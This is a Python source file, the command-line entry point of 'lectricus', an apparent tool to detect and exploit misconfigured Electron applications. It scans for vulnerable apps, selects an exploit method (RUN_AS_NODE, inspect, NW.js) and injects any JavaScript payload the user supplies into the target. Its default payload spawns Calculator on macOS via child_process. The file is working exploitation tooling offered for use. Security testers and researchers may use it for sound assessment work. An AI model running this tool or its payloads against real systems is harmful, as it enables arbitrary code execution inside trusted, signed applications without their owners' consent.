"""
command_line.py: Command Line entry point for lectricus
"""

import sys
import logging
import argparse
import plistlib
import subprocess

from pathlib import Path

from .binary_search         import BinarySearch
from .export_results        import ExportVulnerableApplications
from .binary_classification import ElectronVulnerabilityClassification

from .electron_exploits.inspect     import Inspect
from .electron_exploits.run_as_node import RunAsNode
from .electron_exploits.nwjs        import NWJS

from electron_fuses import ResolveFramework, FuseV1Options


def _find_binaries(app_directory: str = None, sys_platform: str = None) -> BinarySearch:
    """
    Find binaries in the specified directory

    If no directory is specified, search in the default locations
    Use 'sys_platform' when searching on external drives of other platforms
    """
    return BinarySearch(
        **{"search_paths": [app_directory]} if app_directory else {},
        **{"platform": sys_platform} if sys_platform else {}
    )


def __determine_best_exploit_method(application: str) -> str:
    """
    Determine best exploit method based on the application
    """
    entry_point = __application_to_entry_point(application)
    framework = ResolveFramework(application).framework

    result = ElectronVulnerabilityClassification(entry_point, framework).vulnerability_classification()

    # Check if 'vulnerabilities' key is present and not empty
    if "vulnerabilities" not in result or len(result["vulnerabilities"]) == 0:
        raise ValueError("No vulnerabilities found in application")

    vulnerabilities = {
        "run_as_node": FuseV1Options.RUN_AS_NODE,
        "runasnode":   FuseV1Options.RUN_AS_NODE, # Alias
        "nwjs":        FuseV1Options.RUN_AS_NODE, # NWJS uses the same exploit as 'run_as_node'
        "inspect":     FuseV1Options.ENABLE_NODE_CLI_INSPECT_ARGUMENTS,
    }

    for method, vulnerability in vulnerabilities.items():
        if vulnerability.name in result["vulnerabilities"]:
            return method

    raise ValueError(f"Unknown vulnerability: {result['vulnerabilities']}")


def __application_to_entry_point(application: str) -> str:
    """
    Convert application to entry point

    On Windows and Linux, returns the application path
    For macOS, returns the path to the executable inside the .app bundle

    Executable detection is done by reading the Info.plist file
    """
    if Path(application).is_file():
        return application

    # Locate 'CFBundleExecutable' key
    info_plist = Path(application) / "Contents" / "Info.plist"
    if info_plist.is_file():
        plist = plistlib.load(open(info_plist, "rb"))
        if "CFBundleExecutable" in plist:
            return str(Path(application) / "Contents" / "MacOS" / plist["CFBundleExecutable"])

    # If not present in Info.plist, search for executables in the MacOS directory
    for file in (Path(application) / "Contents" / "MacOS").iterdir():
        if file.is_file():
            return str(file)

    raise KeyError(f"CFBundleExecutable not found in {info_plist}")


def _exploit(method: str, application: str, javascript_payload: str) -> None:
    """
    Method is case-insensitive
    """
    methods = {
        "inspect":     Inspect,
        "run_as_node": RunAsNode,
        "runasnode":   RunAsNode, # Alias
        "nwjs":        NWJS
    }

    if method is None:
        method = __determine_best_exploit_method(application)
    if method.lower() not in methods:
        raise ValueError(f"Invalid exploit method: {method}")

    entry_point = __application_to_entry_point(application)

    logging.info(f"Selected exploit method: {method}")
    logging.info(f"Determined entry point: {entry_point}")

    return methods[method.lower()](
        exploitable_application=entry_point,
        javascript_payload=javascript_payload
    ).run()


def _export_results(binary_search_results: dict, location: str = None, format: str = "plist") -> None:
    """
    Export vulnerability results
    """
    return ExportVulnerableApplications(binary_search_results, location, format).export()


def _init_logging(verbose: bool = False, silent: bool = False) -> None:
    """
    Initialize logging.
    """
    if logging.getLogger().hasHandlers():
        return

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s" if verbose is False else "[%(levelname)-8s] [%(filename)-20s]: %(message)s",
        handlers=[
            logging.StreamHandler() if silent is False else logging.NullHandler()
        ]
    )


def _is_ripeda_signed() -> bool:
    """
    Check if self is signed with RIPEDA Consulting's certificate
    """
    if sys.platform != "darwin":
        return False

    requirement = r'anchor apple generic and certificate 1[field.1.2.840.113635.100.6.2.6] /* exists */ and certificate leaf[field.1.2.840.113635.100.6.1.13] /* exists */ and certificate leaf[subject.OU] = "2U3GKQ7U8Z"'

    return subprocess.run(["/usr/bin/codesign", "--test-requirement", requirement, sys.executable], capture_output=True, text=True).returncode == 0


def main():
    """
    Command Line entry point for lectricus
    """
    _init_logging()

    parser = argparse.ArgumentParser(
        description="Detect and exploit misconfigured Electron applications"
    )

    parser.add_argument(
        "--list-vulnerable-apps",
        "-l",
        action="store_true",
        help="List vulnerable applications"
    )

    parser.add_argument(
        "--export",
        "-e",
        action="store_true",
        help="Export vulnerable applications, if '--export-location' is not specified, export to STDOUT"
    )

    parser.add_argument(
        "--format",
        "-f",
        default="plist",
        help="Export format (xml, plist, json, csv)"
    )

    parser.add_argument(
        "--export-location",
        "-o",
        help="Export location"
    )

    parser.add_argument(
        "--app-directory",
        "-d",
        help="Application directory to search. Can provide .app directly"
    )

    parser.add_argument(
        "--sys-platform",
        "-p",
        help="Override sys.platform value used for application search. Useful for cross-platform exploitation on external drives."
    )

    parser.add_argument(
        "--exploit-application",
        "-x",
        help="Application to exploit."
    )
    parser.add_argument(
        "--exploit-method",
        "-m",
        help="Exploit method to use."
    )
    parser.add_argument(
        "--javascript-payload",
        "-j",
        help="JavaScript payload to execute. If not specified, open Calculator on macOS."
    )
    parser.add_argument(
        "--javascript-payload-file",
        "-J",
        help="JavaScript payload file to execute. Alternative to '--javascript-payload'."
    )

    args = parser.parse_args()

    if args.list_vulnerable_apps:
        result = _find_binaries(args.app_directory, args.sys_platform)
        _export_results(result.apps, args.export_location, args.format if args.export else "generic")
    elif args.exploit_application:
        if _is_ripeda_signed() is True:
            logging.warning("Exploitation is not allowed for RIPEDA Consulting signed executables")
            logging.warning("Please resign the executable as adhoc or with your own certificate")
            logging.warning(f"ex. 'codesign -f -s - {Path(sys.executable).name}'")
            sys.exit(1)

        javascript_payload = None

        if args.javascript_payload:
            javascript_payload = args.javascript_payload
        elif args.javascript_payload_file:
            with open(args.javascript_payload_file, "r") as file:
                javascript_payload = file.read()
        elif sys.platform == "darwin":
            javascript_payload = 'const { exec } = require("child_process"); exec("/usr/bin/open -a Calculator");'
        else:
            raise ValueError("JavaScript payload not specified")

        _exploit(args.exploit_method, args.exploit_application, javascript_payload)

    else:
        parser.print_help()
        sys.exit(0)
